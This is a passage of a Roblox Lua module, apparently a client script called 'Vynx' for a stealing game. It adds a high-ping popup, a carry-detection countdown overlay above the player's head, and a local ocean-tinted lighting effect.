    pingLbl.TextXAlignment = Enum.TextXAlignment.Left
    pingLbl.ZIndex = 2

    local SHOW_POS = UDim2.new(1, -268, 0, 16)
    local HIDE_POS = UDim2.new(1, -268, 0, -80)
    local popupVisible = false
    local hideTask = nil
    local threshold = math.max(50, tonumber(M.pingAlertThreshold) or 120)

    local function showNotif(pingMs)
        pingLbl.Text = tostring(pingMs) .. " ms  ·  Duel"
        if not popupVisible then
            popupVisible = true
            TweenService:Create(notifFrame,
                TweenInfo.new(0.22, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                {Position = SHOW_POS}):Play()
        end
        if hideTask then pcall(function() task.cancel(hideTask) end) end
        hideTask = task.delay(5, function()
            popupVisible = false
            if notifFrame and notifFrame.Parent then
                TweenService:Create(notifFrame,
                    TweenInfo.new(0.22, Enum.EasingStyle.Quad, Enum.EasingDirection.In),
                    {Position = HIDE_POS}):Play()
            end
        end)
    end

    M._pingAlertTask = task.spawn(function()
        while M.pingAlertEnabled do
            local pingMs = 0
            pcall(function()
                pingMs = math.floor(player:GetNetworkPing() * 1000 + 0.5)
            end)
            if pingMs <= 0 then
                pcall(function()
                    local stats = game:GetService("Stats")
                    local item = stats and stats.Network and stats.Network.ServerStatsItem and stats.Network.ServerStatsItem["Data Ping"]
                    if item then pingMs = math.floor(item:GetValue() or 0) end
                end)
            end
            threshold = math.max(50, tonumber(M.pingAlertThreshold) or 120)
            if pingMs > threshold then
                showNotif(pingMs)
            end
            task.wait(5)
        end
    end)
end

function M.stopPingAlert()
    M.pingAlertEnabled = false
    if M._pingAlertTask then
        pcall(function() task.cancel(M._pingAlertTask) end)
        M._pingAlertTask = nil
    end
    if M.pingPopupGui then
        pcall(function() M.pingPopupGui:Destroy() end)
        M.pingPopupGui = nil
    end
    M.pingPopupActive = false
end

if M.pingAlertEnabled and M.startPingAlert then
    task.defer(function()
        task.wait(1.5)
        pcall(function() M.startPingAlert() end)
    end)
end


M.e01Enabled = true
M._e01WasCarrying = false
M._e01Conn = nil
M._e01HeadConn = nil

function M.isE01Carrying(char)
    char = char or player.Character
    if not char then return false end

    for _, child in ipairs(char:GetChildren()) do
        local name = string.lower(child.Name or "")
        if name:find("brainrot") or name:find("brain") or name:find("animal")
            or name:find("carry") or name:find("stolen") or name:find("held")
            or name:find("steal") then
            return true
        end
    end

    local okAttrs, attrs = pcall(function() return char:GetAttributes() end)
    if okAttrs and type(attrs) == "table" then
        for attrName, attrValue in pairs(attrs) do
            local name = string.lower(tostring(attrName))
            if (name:find("carrying") or name:find("carry") or name:find("stealing")
                or name:find("isstealing") or name:find("hasbrainrot")) and attrValue == true then
                return true
            end
        end
    end

    local humanoid = char:FindFirstChildOfClass("Humanoid")
    if humanoid and humanoid.WalkSpeed > 0 and humanoid.WalkSpeed <= 25 and humanoid.WalkSpeed ~= 16 then
        return true
    end
    return false
end

function M.startE01HeadCountdown(char)
    if M.e01Enabled == false then return end
    char = char or player.Character
    if not char then return end
    local head = char:FindFirstChild("Head")
    if not head then return end

    local old = head:FindFirstChild("HeadStealUI")
    if old then pcall(function() old:Destroy() end) end

    local RED = ((M.accentColor and M.accentColor()) or Color3.fromRGB(0, 130, 200))
    local WHITE = Color3.fromRGB(255, 255, 255)
    local BLACK = Color3.fromRGB(0, 0, 0)

    local billboard = Instance.new("BillboardGui")
    billboard.Name = "HeadStealUI"
    billboard.Adornee = head
    billboard.Size = UDim2.new(0, 620, 0, 80)
    billboard.StudsOffset = Vector3.new(0, 7, 0)
    billboard.AlwaysOnTop = true
    billboard.MaxDistance = 200
    billboard.LightInfluence = 0
    billboard.Parent = head

    local textLabel = Instance.new("TextLabel")
    textLabel.Size = UDim2.new(1, 0, 1, 0)
    textLabel.BackgroundTransparency = 1
    textLabel.TextColor3 = RED
    textLabel.TextStrokeColor3 = BLACK
    textLabel.TextStrokeTransparency = 0
    textLabel.Font = Enum.Font.GothamBlack
    textLabel.TextSize = 26
    textLabel.Text = ""
    textLabel.Parent = billboard

    local duration = 3.0
    local startTime = tick()
    local finished = false
    local connection

    connection = RunService.RenderStepped:Connect(function()
        if finished then return end
        if not billboard.Parent or not textLabel.Parent then
            finished = true
            if connection then connection:Disconnect() end
            return
        end

        local remaining = math.max(0, duration - (tick() - startTime))
        if remaining > 0 then
            textLabel.Text = string.format("DONT STEAL OR E01 DISCONNECT (%.1fs)", remaining)
            textLabel.TextColor3 = RED
            textLabel.TextStrokeColor3 = BLACK
        else
            finished = true
            if connection then connection:Disconnect() end
            textLabel.Text = "STEAL NOW!"
            textLabel.TextColor3 = WHITE
            textLabel.TextStrokeColor3 = BLACK
            task.spawn(function()
                task.wait(2)
                if billboard and billboard.Parent then
                    local fadeOut = TweenService:Create(textLabel, TweenInfo.new(0.5), {
                        TextTransparency = 1,
                        TextStrokeTransparency = 1,
                    })
                    fadeOut:Play()
                    fadeOut.Completed:Connect(function()
                        pcall(function() billboard:Destroy() end)
                    end)
                end
            end)
        end
    end)
end

function M.startE01Watch()
    if M._e01HeadConn then
        pcall(function() task.cancel(M._e01HeadConn) end)
        M._e01HeadConn = nil
    end
    M._e01WasCarrying = false
    M._e01HeadConn = task.spawn(function()
        while M.e01Enabled ~= false do
            local currently = false
            pcall(function() currently = M.isE01Carrying(player.Character) end)
            if not M._e01WasCarrying and currently then
                pcall(function() M.startE01HeadCountdown(player.Character) end)
            end
            M._e01WasCarrying = currently
            task.wait(0.1)
        end
    end)
end

task.defer(function()
    task.wait(1.0)
    pcall(function() M.startE01Watch() end)
end)


function M.applyOceanSky()
    local ok, err = pcall(function()
        local Lighting = game:GetService("Lighting")
        -- Soft azzurro tint — keeps map sky, only cools some parts
        Lighting.OutdoorAmbient = Color3.fromRGB(170, 200, 230)
        Lighting.Ambient = Color3.fromRGB(130, 160, 190)
        Lighting.ColorShift_Top = Color3.fromRGB(160, 210, 255)
        Lighting.ColorShift_Bottom = Color3.fromRGB(90, 130, 170)
        pcall(function() Lighting.EnvironmentDiffuseScale = 0.5 end)
        pcall(function() Lighting.EnvironmentSpecularScale = 0.3 end)

        local atmo = Lighting:FindFirstChild("VynxOceanAtmo")
        if not atmo then
            atmo = Lighting:FindFirstChildOfClass("Atmosphere")
            if not atmo then
                atmo = Instance.new("Atmosphere")
                atmo.Name = "VynxOceanAtmo"
                atmo.Parent = Lighting
            else
                atmo.Name = "VynxOceanAtmo"
            end
        end
        pcall(function()
            atmo.Color = Color3.fromRGB(180, 215, 245)
            atmo.Decay = Color3.fromRGB(110, 155, 200)
            atmo.Density = 0.12
            atmo.Offset = 0.1
            atmo.Glare = 0.08
            atmo.Haze = 0.55
        end)

        local cc = Lighting:FindFirstChild("VynxOceanCC")
        if not cc then
            cc = Instance.new("ColorCorrectionEffect")
            cc.Name = "VynxOceanCC"
            cc.Parent = Lighting
        end
        pcall(function()
            cc.Enabled = true
            cc.Brightness = 0.03
            cc.Contrast = 0.02
            cc.Saturation = 0.06
            cc.TintColor = Color3.fromRGB(220, 235, 250)
        end)
        -- Do NOT replace Skybox fully — leave original map sky, only soft azure wash
    end)
    if not ok then
        warn("[VYNX] applyOceanSky failed: " .. tostring(err))
    end
end

print("Vynx loaded successfully!")
return M
